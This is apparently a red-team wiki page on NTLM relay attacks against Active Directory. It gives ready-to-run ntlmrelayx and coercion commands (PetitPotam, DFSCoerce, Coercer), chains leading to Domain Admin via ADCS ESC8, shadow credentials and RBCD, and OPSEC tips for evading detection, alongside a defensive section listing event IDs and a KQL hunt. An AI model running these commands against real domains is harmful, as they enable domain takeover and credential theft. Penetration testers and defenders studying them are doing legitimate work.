---
title: NTLM relay attacks
slug: ntlm-relay
aliases: [ntlm-relay-attacks, ntlmrelayx]
---
{% raw %}

NTLM relay is the workhorse of internal AD compromise. You coerce a privileged account (machine or user) to authenticate to a box you control, then forward that authentication — unmodified — to a third service that does not enforce signing or channel binding. The relayed session inherits the victim's privileges on the target. It shows up on nearly every internal engagement because Microsoft still ships NTLM enabled, signing defaults are inconsistent across roles, and ADCS web endpoints are usually deployed without EPA. If you can coerce a Domain Controller and relay to ADCS HTTP, you get a DA cert in under a minute.

## Mental model

NTLM is a challenge/response: client sends NEGOTIATE, server sends CHALLENGE, client sends AUTHENTICATE (NTLMv2 response = HMAC over the challenge + target name + AV pairs using the user's NT hash). The protocol has no binding between the transport (TCP session) and the authentication blob, unless signing or Extended Protection for Authentication (EPA / channel binding) is on.

```
victim DC01 ---(1) coerce: EfsRpc/MS-RPRN/MS-FSRVP---> attacker (relay)
attacker ---(2) forward NEGOTIATE/AUTH unchanged-----> target (CA, DC, file server)
target  ---(3) authenticated session as DC01$--------> ESC8 / RBCD / DCSync
```

Two prerequisites:
- The victim must reach the attacker on a port speaking NTLM (SMB 445, HTTP 80/443, LDAP 389).
- The downstream target must accept NTLM without signing/EPA enforcement.

See [[ntlm]] for the auth message internals and [[active-directory]] for the trust model.

## Tradecraft

Set up the relay. impacket >= 0.12 ships a working `ntlmrelayx.py`.

```bash
# SMB -> SMB, command execution
ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -enc ...'

# SMB -> LDAP, dump domain + add shadow credentials on relayed computer object
ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --shadow-credentials \
              --shadow-target 'DC01$'

# SMB -> LDAPS, set RBCD so attacker-controlled computer can impersonate
ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support --delegate-access \
              --escalate-user attacker$

# HTTP -> LDAPS, drsuapi DCSync via relayed DC account
ntlmrelayx.py -t ldaps://dc01.corp.local --no-dump --no-da --no-acl \
              --no-validate-privs --dump-laps

# HTTP -> HTTP (ADCS ESC8): request a cert as the relayed DC$
ntlmrelayx.py -t https://ca01.corp.local/certsrv/certfnsh.asp \
              -smb2support --adcs --template DomainController
```

Now coerce. Pick a primitive based on what is patched.

```bash
# PetitPotam (MS-EFSR) — unauth pre-patch, authed post-patch
PetitPotam.py -u low -p low attacker.corp.local dc01.corp.local

# PrinterBug / SpoolSample (MS-RPRN)
dementor.py -d corp.local -u low -p low attacker.corp.local dc01.corp.local

# DFSCoerce (MS-DFSNM)
dfscoerce.py -u low -p low attacker.corp.local dc01.corp.local

# Coercer — try them all, pick what answers
coercer coerce -u low -p low -d corp.local -l attacker.corp.local -t dc01.corp.local
```

Killer chains seen on real engagements:
- Coerce DC01 with PetitPotam, relay HTTP auth to `/certsrv/certfnsh.asp` on the CA, request a cert for template `DomainController`, then `gettgtpkinit.py` -> `getnthash.py` -> [[pass-the-hash]] -> DA. This is [[adcs-attacks]] ESC8.
- Coerce a file server, relay SMB to LDAPS, write `msDS-KeyCredentialLink` on a target computer ([[shadow-credentials]]) or `msDS-AllowedToActOnBehalfOfOtherIdentity` to set [[resource-based-constrained-delegation]], then S4U2self+S4U2proxy to it as Administrator.
- Coerce any low-priv user via responder LLMNR poisoning, relay to LDAP, run [[kerberoasting]] queries with full ACL visibility.

Recon what is signed before you make noise. See [[smb-enum]] and [[ldap-enum]] for full sweeps.

```bash
nxc smb 10.0.0.0/24 --gen-relay-list relay-targets.txt   # SMB signing off
nxc ldap dc01 -u low -p low -M ldap-checker              # LDAP signing/CB state
certipy find -u low@corp.local -p low -dc-ip 10.0.0.1 -vulnerable -enabled
```

Kerberos relay variant (KrbRelayUp / KrbRelay) abuses the AP-REQ flow against LOCAL services with no SPN check — useful for local SYSTEM on a domain-joined Windows host even when NTLM is off. Different primitive, same downstream sinks (LDAP write, RBCD).

## Detection / telemetry

What defenders actually see:
- 4624 logon type 3 where the `WorkstationName` does not match the source IP's hostname, or where the source IP is the attacker host but the account is a DC machine account. Highly catchable.
- 4624/4648 on the CA web enrollment server for a computer account ending in `$` — abnormal for ESC8.
- 5145 (file share access) for IPC$ from unusual sources, especially right before 4624 on a different host (the relay).
- 5136 directory service changes on `msDS-KeyCredentialLink`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, `userAccountControl` — write these to a hot SIEM queue.
- Microsoft Defender for Identity: "Suspected NTLM relay attack (Exchange account)", "Suspected overpass-the-hash", "Suspected AD FS DKM key read". MDI sees the relayed auth as the wrong source.
- Sysmon 3 (network) from an unprivileged workstation to LDAP/LDAPS on a DC is loud.

KQL hunt for the ESC8 signature:

```kql
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where TargetUserName endswith "$"
| where Computer has_any ("CA", "PKI", "CERT")
| project TimeGenerated, Computer, TargetUserName, IpAddress, WorkstationName
```

## OPSEC pitfalls

- SMB signing has been enforced by default on Windows 11 24H2 and Server 2025 since 2024-2025; assume DCs reject unsigned SMB. Always recon first with `nxc --gen-relay-list`.
- Do not relay coerced auth back to the originating host. Modern Windows blocks this (MS08-068 mitigation, "loopback" filter) and it generates a clean detection.
- `--adcs` against a CA without `-smb2support` or with the wrong template will throw `CERTSRV_E_TEMPLATE_DENIED` — noisy and one-shot per coerce.
- Do not crash the target. `ntlmrelayx` defaults will happily drop a service binary via SMB; on a production fileserver that triggers EDR. Prefer `--no-smb-server` data exfil or LDAP-only paths.
- Shadow-credentials writes are auditable. If 5136 monitoring is on, expect a callback within minutes. Use the cert, dump the hash, then revert the attribute.
- LLMNR/NBT-NS poisoning with Responder while `ntlmrelayx` is running: disable Responder's SMB and HTTP servers (`SMB = Off`, `HTTP = Off` in `Responder.conf`) so the coerced auth lands on the relay, not Responder's hash logger.

## References

- https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
- https://www.thehacker.recipes/ad/movement/ntlm/relay
- https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- https://learn.microsoft.com/en-us/defender-for-identity/alerts-overview
- https://github.com/topotam/PetitPotam
- https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab

See also: [[ntlm]], [[adcs-attacks]], [[shadow-credentials]], [[resource-based-constrained-delegation]], [[pass-the-hash]], [[kerberoasting]], [[smb-enum]], [[lateral-movement-playbook]], [[ad-coercion-and-relay-matrix-2025]], [[impacket-toolkit-overview]], [[ntlm-relay-ws2025-mitigations]], [[winreg-relay-2024]]
{% endraw %}
